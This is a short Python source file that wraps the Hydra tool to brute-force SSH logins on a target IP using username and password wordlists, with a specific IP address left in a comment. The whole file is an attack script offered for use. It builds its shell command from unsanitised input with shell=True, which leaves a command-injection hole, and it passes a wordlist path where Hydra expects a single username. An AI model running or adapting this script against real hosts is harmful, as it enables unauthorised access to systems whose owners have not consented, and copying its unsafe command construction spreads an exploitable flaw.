from subprocess import Popen


def bruteforce(ip):
    # ip = '120.79.214.167'
    service = 'ssh'
    p1 = Popen('hydra -l ./Attack/Hydra/user.txt -P ./Attack/Hydra/dic.txt -e sn -o ./Attack/Hydra/info_list.json {} {}'.format(ip, service), shell=True)

    print(p1.communicate())
    return 'start scanning!'
